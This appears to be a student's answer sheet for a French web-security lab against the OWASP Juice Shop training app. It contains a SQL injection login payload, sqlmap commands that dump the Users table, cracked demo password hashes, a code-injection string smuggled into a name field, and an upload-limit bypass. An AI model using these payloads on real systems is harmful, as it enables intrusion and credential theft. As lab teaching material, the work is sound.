Exercise 2
==========

### 1.

> Essayez le challenge “Login Admin”; vous pouvez suivre le tutorial intégré en cliquant sur le bouton dans le scoreboard.

Login with `' OR 1=1; --` as username.

### 2.

> Nous allons utiliser sqlmap pour voler le contenu de la base de données du site. sqlmap est un outil qui peut automatiser l’exploitation d’une injection SQL même dans des scénarios difficiles (side-channel basée sur le temps, etc…) 
> a. Quelle est l’utilité des paramètres --level et --risk ?
> b. Trouvez une URL GET avec un paramètre exploitable
> c. Trouvez le nom de la table et de ses colonnes contenant l’email et le hash des utilisateurs
> d. Récupérez le contenu de ces deux colonnes
> e. Tentez de cracker ces hashes
> f. Quel est le nom de la vulnérabilitée exploitée ici ? Quel type de requête SQL est utilisée pour accéder aux tables ?
> g. Comment corrigeriez-vous la vulnérabilité 

#### 2.a.

Allows to toggle more dangerous checks that might be easily detected by potential countermeasures.

#### 2.b.

Product search endpoint on the server side, using http://localhost:3000/rest/products/search?q=

#### 2.c.

`sqlmap 'http://localhost:3000/rest/products/search?q=""' --level=3 --risk=3 --schema`

-> Users

#### 2.d.

`sqlmap 'http://localhost:3000/rest/products/search?q=""' --dump -T Users`

#### 2.e.

J12934@juice-sh.op      0192023a7bbd73250516f069df18b500 (admin123)
accountant@juice-sh.op  e541ca7ecf72b8d1286474fc613e5e45 (ncc-1701)
morty@juice-sh.op       fe01ce2a7fbac8fafaed7c982a04e229 (demo)
wurstbrot@juice-sh.op   2c17c6393771ee3048ae34d6b380c5ec (private)

#### 2.f.

SQL injection with 'boolean-based blind' payloads.

#### 2.g.

Named parameters in queries.

### 3.

> Faites le challenge “View Basket”.
> a. Quel est le nom de la vulnérabilité ?
> b. Sous quel CWE la classe-t-on ?

Unauthorized access to another user's data.

CWE-284: Improper Access Control

### 4.

Give the following name, and add more inputs :

`name"); process=null; users.addUser("yikes", "`

### 5.

Generate a file of 99.9 kb and intercept with burp, then add 100 or so bytes and change the filename.

